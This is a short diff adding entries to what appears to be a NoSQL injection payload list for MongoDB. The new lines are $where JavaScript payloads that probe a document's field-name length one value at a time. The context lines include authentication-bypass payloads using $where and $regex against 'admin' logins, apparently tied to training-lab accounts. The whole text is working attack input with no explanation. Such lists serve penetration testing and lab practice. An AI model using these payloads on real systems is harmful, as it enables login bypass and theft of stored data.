@@ -13,6 +13,16 @@ $where: '1 == 1'
 {"username":"wiener","password":"peter", "$where":"1"}
 "$where":"Object.keys(this)[0].match('^.{0}a.*')"
 "$where": "Object.keys(this)[0].match(/^a.*/)"
+"$where": "Object.keys(this)[0].length == 1"
+"$where": "Object.keys(this)[0].length == 2"
+"$where": "Object.keys(this)[0].length == 3"
+"$where": "Object.keys(this)[0].length == 4"
+"$where": "Object.keys(this)[0].length == 5"
+"$where": "Object.keys(this)[0].length == 6"
+"$where": "Object.keys(this)[0].length == 7"
+"$where": "Object.keys(this)[0].length == 8"
+"$where": "Object.keys(this)[0].length == 9"
+"$where": "Object.keys(this)[0].length == 10"
 {"$where": "Object.keys(this)[0].match(/^a.*/)"}
 {"username":"admin","password":{"$regex":"^.*"}}
 {"username":"admin","password":{"$regex":"^a.*"}}
